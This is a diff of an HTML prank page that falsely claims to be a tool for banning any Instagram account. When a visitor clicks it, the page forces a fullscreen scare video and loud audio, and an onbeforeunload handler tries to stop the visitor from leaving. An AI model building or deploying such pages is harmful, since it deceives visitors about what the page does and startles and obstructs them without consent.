@@ -3,145 +3,114 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>⚠️ Cytra Ban Account Software ⚠️</title>
+<title>Cytra's IG Account Ban</title>
 <style>
   body {
     background: #000;
-    color: #ff0000;
-    font-family: Arial, sans-serif;
+    color: #0f0;
+    font-family: monospace;
     text-align: center;
-    padding: 2rem;
+    padding-top: 8%;
+    overflow: hidden;
+    text-shadow: 0 0 5px #0f0;
   }
   h1 {
-    font-size: 2.8rem;
-    text-shadow: 0 0 20px #ff0000;
-    letter-spacing: 2px;
+    font-size: 2rem;
+    animation: glitch 0.5s infinite;
   }
-  p {
-    color: #ff5555;
+  h2 {
+    font-size: 1.3rem;
+    color: #0f0;
+    opacity: 0.8;
     margin-bottom: 1.5rem;
-    font-size: 1.2rem;
   }
-  input {
-    padding: 12px;
-    border: 2px solid #ff0000;
-    border-radius: 8px;
-    background: #222;
-    color: white;
-    width: 80%;
-    max-width: 320px;
-    margin-top: 20px;
-    font-size: 1rem;
+  p, input, button {
+    font-size: 1.1rem;
   }
-  button {
-    padding: 14px 28px;
-    margin-top: 20px;
-    border: none;
-    border-radius: 8px;
-    background: #ff0000;
-    color: white;
-    cursor: pointer;
-    box-shadow: 0 0 10px #ff0000;
-    font-size: 1.2rem;
-    transition: all 0.3s;
+  input, button {
+    padding: 0.7rem 1.2rem;
+    background: #111;
+    color: #0f0;
+    border: 1px solid #0f0;
+    border-radius: 4px;
+    box-shadow: 0 0 10px #0f0;
+    margin: 0.5rem;
   }
   button:hover {
-    background: #ff5555;
-    box-shadow: 0 0 20px #ff5555;
+    background: #0f0;
+    color: #000;
+    cursor: pointer;
   }
-  .progress-container {
-    width: 80%;
-    max-width: 320px;
-    height: 20px;
-    background: #333;
-    border-radius: 10px;
-    overflow: hidden;
-    margin: 1.5rem auto;
+  @keyframes glitch {
+    0% { transform: none; opacity: 1; }
+    20% { transform: skew(-3deg, -1deg); opacity: 0.8; }
+    40% { transform: skew(3deg, 1deg); opacity: 0.6; }
+    60% { transform: skew(-1deg, 2deg); opacity: 0.9; }
+    80% { transform: skew(2deg, -2deg); opacity: 0.7; }
+    100% { transform: none; opacity: 1; }
+  }
+  video {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    object-fit: cover;
+    z-index: 9999;
     display: none;
   }
-  .progress-bar {
-    height: 100%;
-    background: #ff0000;
-    width: 0%;
-    transition: width 0.1s linear;
-  }
-  .scare { display: none; }
-  video {
-    width: 100vw;
-    height: 100vh;
-    object-fit: cover;
+  body::before {
+    content: "";
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: repeating-linear-gradient(
+      rgba(0, 255, 0, 0.03) 0px,
+      rgba(0, 255, 0, 0.03) 2px,
+      transparent 2px,
+      transparent 4px
+    );
+    pointer-events: none;
+    z-index: 100;
   }
 </style>
 </head>
 <body>
 
-<h1>⚠️ Cytra Ban Account Software ⚠️</h1>
-<p>This is an official tool by Cytra to permanently <strong>ban</strong> any Instagram account. Enter the username and click BAN ACCOUNT.</p>
+<h1>⚠️ CYTRA’S IG ACCOUNT BAN SYSTEM</h1>
+<h2>Welcome to Cytra’s Secret Terminal</h2>
+<p>Enter IG username to begin purge:</p>
+<input id="igUser" placeholder="IG username" />
+<button id="banButton">LAUNCH</button>
 
-<form>
-  <input id="usernameInput" type="text" placeholder="Enter IG username to ban" required />
-  <br/>
-  <button id="banButton">BAN ACCOUNT 🔥</button>
-</form>
-
-<div class="progress-container" id="progressContainer">
-  <div class="progress-bar" id="progressBar"></div>
-</div>
-
-<audio id="creepyAudio" src="creepy_sound.mp3" preload="auto"></audio>
-
-<div class="scare">
-  <video id="scareVideo" src="scare.mp4" loop></video>
-</div>
+<video id="scaryVideo" src="lv_0_20250625182535.mp4" muted loop></video>
+<audio id="scarySound" src="kuma.m4a" loop></audio>
 
 <script>
-  const video = document.getElementById('scareVideo');
-  const scare = document.querySelector('.scare');
-  const usernameInput = document.getElementById('usernameInput');
-  const banButton = document.getElementById('banButton');
-  const progressContainer = document.getElementById('progressContainer');
-  const progressBar = document.getElementById('progressBar');
-  const creepyAudio = document.getElementById('creepyAudio');
+  const btn = document.getElementById('banButton')
+  const video = document.getElementById('scaryVideo')
+  const sound = document.getElementById('scarySound')
 
-  banButton.addEventListener('click', function(e) {
-    e.preventDefault();
-    const username = usernameInput.value.trim();
-    if (username === '') {
-      alert('Please enter a username to ban!');
-      return;
+  btn.onclick = () => {
+    const username = document.getElementById('igUser').value.trim()
+    if (!username) {
+      alert('Error: Username required')
+      return
     }
 
-    creepyAudio.play();
-    progressContainer.style.display = 'block';
-    progressBar.style.width = '0%';
-    let progress = 0;
+    video.style.display = 'block'
+    video.play().catch(err => console.log(err))
 
-    const interval = setInterval(() => {
-      progress += Math.random() * 10;
-      if (progress >= 100) progress = 100;
-      progressBar.style.width = progress + '%';
-      if (progress >= 100) {
-        clearInterval(interval);
-        setTimeout(() => triggerScare(), 500); // wait a bit before scare
-      }
-    }, 200);
-  });
+    sound.volume = 1.0
+    sound.play().catch(err => console.log(err))
 
-  function triggerScare() {
-    scare.style.display = 'block';
-    video.play();
-    goFullscreen();
+    if (document.documentElement.requestFullscreen) {
+      document.documentElement.requestFullscreen().catch(() => {})
+    }
+
+    window.onbeforeunload = (e) => {
+      e.preventDefault()
+      return "Access Denied. You cannot leave Cytra's domain!"
+    }
   }
-
-  function goFullscreen() {
-    const el = document.documentElement;
-    if (el.requestFullscreen) el.requestFullscreen();
-    else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
-    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-    else if (el.msRequestFullscreen) el.msRequestFullscreen();
-  }
-
-  video.addEventListener('click', goFullscreen);
 </script>
 
 </body>
